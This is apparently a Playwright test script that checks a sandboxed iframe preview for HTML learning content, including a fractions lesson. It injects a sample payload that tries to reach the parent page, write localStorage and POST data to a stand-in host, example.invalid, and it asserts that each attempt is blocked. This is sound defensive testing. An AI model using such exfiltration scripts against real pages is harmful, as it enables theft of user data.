const fs = require('node:fs');
const assert = require('node:assert/strict');
const ts = require('typescript');
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ executablePath: 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe', headless: true });
  try {
    const page = await browser.newPage({ viewport: { width: 1500, height: 950 } });
    await page.goto('about:blank');
    await page.addScriptTag({ path: require.resolve('dompurify').replace('purify.cjs.js', 'purify.js') });
    const code = ts.transpileModule(fs.readFileSync('apps/web/lib/learning-preview.ts', 'utf8'), { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022, esModuleInterop: true } }).outputText;
    await page.evaluate(code => { window.exports = {}; window.require = () => window.DOMPurify; eval(code); }, code);
    const mount = source => page.evaluate(source => new Promise(resolve => {
      document.querySelector('iframe')?.remove();
      const frame = document.createElement('iframe');
      frame.setAttribute('sandbox', 'allow-scripts');
      frame.style = 'width:100%;height:900px;border:0';
      frame.srcdoc = window.exports.learningPreviewDocument(source, true);
      frame.onload = () => resolve();
      document.body.append(frame);
    }), source);
    if (process.argv[2]) {
      await mount(fs.readFileSync(process.argv[2], 'utf8'));
      const frame = page.frames()[1];
      await frame.waitForFunction(() => !!window.tailwind && document.querySelectorAll('svg').length > 0, { timeout: 30000 });
      await frame.locator('#senilai-n').evaluate(e => { e.value = '4'; e.dispatchEvent(new Event('input', { bubbles: true })); });
      await frame.locator('[data-tab="tambah"]').click();
      await frame.locator('[data-tab="senilai"]').click();
      await page.screenshot({ path: 'tools/learning-pecahan-preview.png' });
      console.log('PASS: Pecahan styling, rendered figures, slider and tabs');
    }
    let escaped = false;
    await page.route('https://example.invalid/**', route => { escaped = true; return route.abort(); });
    await mount(`<input id="value" value="1" oninput="document.querySelector('#result').textContent=this.value"><span id="result"></span><script>
      window.checks={};
      try{parent.document.body.dataset.compromised='yes';checks.parent=true}catch{checks.parent=false}
      try{localStorage.setItem('attack','1');checks.storage=true}catch{checks.storage=false}
      fetch('https://example.invalid/collect',{method:'POST',body:'answer'}).then(()=>checks.network=true,()=>checks.network=false);
    </script><script src="https://example.invalid/attack.js"></script><img src="https://example.invalid/pixel">`);
    const frame = page.frames()[1];
    await frame.waitForFunction(() => window.checks?.network === false);
    const checks = await frame.evaluate(() => window.checks);
    assert.deepEqual(checks, { parent: false, storage: false, network: false });
    await frame.locator('#value').fill('42');
    assert.equal(await frame.locator('#result').textContent(), '42');
    assert.equal(escaped, false);
    assert.equal(await page.evaluate(() => document.body.dataset.compromised), undefined);
    console.log('PASS: local interaction works; parent access, storage and external requests blocked');
  } finally { await browser.close(); }
})().catch(error => { console.error(error); process.exitCode = 1; });
